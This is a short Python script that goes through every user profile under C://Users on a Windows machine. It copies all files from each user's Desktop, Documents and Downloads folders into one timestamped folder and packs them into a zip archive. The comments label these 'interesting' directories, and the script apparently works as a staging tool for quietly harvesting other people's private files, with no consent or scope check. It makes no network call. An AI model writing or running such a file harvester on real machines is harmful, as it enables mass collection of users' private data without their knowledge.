import os, math, shutil
from datetime import datetime

# Go into and gather files from all users on the pc

path = "C://Users"
users_list = os.listdir(path) # Lists directories from specified path
path_of_users = [] # make a list to store the path of user
totalSize = 0
print("Executing program...")
for dir in users_list:
    full_dir_path = os.path.join(path, dir)
    path_of_users.append(full_dir_path)
    
############## PHASE 2 ############## Looking for specific files inside each User's directory
desktop = 'Desktop'
documents = 'Documents'
downloads = 'Downloads'
interesting_dirs = [] # List to contain desktop, documents, and downloads information
for path in path_of_users:
    desktop_path = os.path.join(path, desktop)
    documents_path = os.path.join(path, documents)
    downloads_path = os.path.join(path, downloads)
    interesting_dirs.append(desktop_path)
    interesting_dirs.append(documents_path)
    interesting_dirs.append(downloads_path)

################# PHASE 3 ################# Iterating through User's Desktop, Documents, and Downloads folders
    
# Function for walking through directories from a starting path specified
def get_filepaths(directory):

    file_paths = [] # List for storing filepaths
    
    # Walking the tree starting from root
    for root, directories, files in os.walk(directory):
        for filename in files:
            # Append string to form full filepath
            filepath = os.path.join(root, filename)
            file_paths.append(filepath) # append filepath to list

    return file_paths

# print all the files found from walking through different User's DDD directories
# The user's who don't have the DDD files won't be outputted.

################# PHASE 4 ################# Copying all files found in users desktop, downloads, and documents folder into one spot located where the file was executed first

now = datetime.now()
dt_string = now.strftime("%d-%m-%Y %H.%M")
os.mkdir(str(dt_string))

for path in interesting_dirs:
    full_file_paths = get_filepaths(path) # path is the starting path that the function will walk through
    for filepath in full_file_paths:
        shutil.copy(filepath, dt_string)

shutil.make_archive(("Z" + dt_string), 'zip', dt_string)
shutil.rmtree(dt_string)
print("Program finished.")
